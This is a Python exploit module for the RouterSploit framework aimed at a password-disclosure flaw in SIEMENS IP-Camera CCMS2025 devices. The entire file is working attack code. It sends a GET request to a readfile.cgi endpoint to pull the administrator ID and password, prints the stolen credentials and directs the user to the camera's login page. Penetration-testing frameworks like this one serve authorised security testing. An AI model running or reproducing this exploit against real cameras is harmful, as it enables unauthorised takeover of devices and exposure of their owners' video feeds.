from routersploit import (
    exploits,
    print_error,
    print_info,
    print_success,
    http_request,
    mute,
    validators
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for SIEMENS IP-Camera CCMS2025 Password Dislosure vulnerability.
    If target is vulnerable it is possible to read administative credentials.
    """
    __info__ = {
        'name': 'SIEMENS IP-Camera CCMS2025 Password Disclosure',
        'description': 'Module exploits SIEMENS IP-Camera CCMS2025 Password Dislosure vulnerability. If target is vulnerable '
                       'it is possible to read administrative credentials',
        'authors': [
            'Yakir Wizman',  # vulnerability discovery
            'VegetableCat <yes-reply[at]linux.com>',  # routersploit module
        ],
        'references': [
            'https://www.exploit-db.com/exploits/40254/',
        ],
        'devices': [
            'SIEMENS IP-Camera CVMS2025-IR',
            'SIEMENS IP-Camera CCMS2025',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1',
                             validators=validators.url)  # target address
    port = exploits.Option(80, 'Target port')  # default port

    def __init__(self):
        self.content = None

    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")
            print_info(self.content)
            print_info("please login at:")
            print_info("{}:{}/cgi-bin/chklogin.cgi".format(self.target, self.port))
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):
        url = "{}:{}/cgi-bin/readfile.cgi?query=ADMINID".format(self.target, self.port)
        response = http_request(method="GET", url=url)

        if response is not None and "Adm_ID" in response.text:
            self.content = response.text
            return True  # target is vulnerable

        return False  # target is not vulnerable
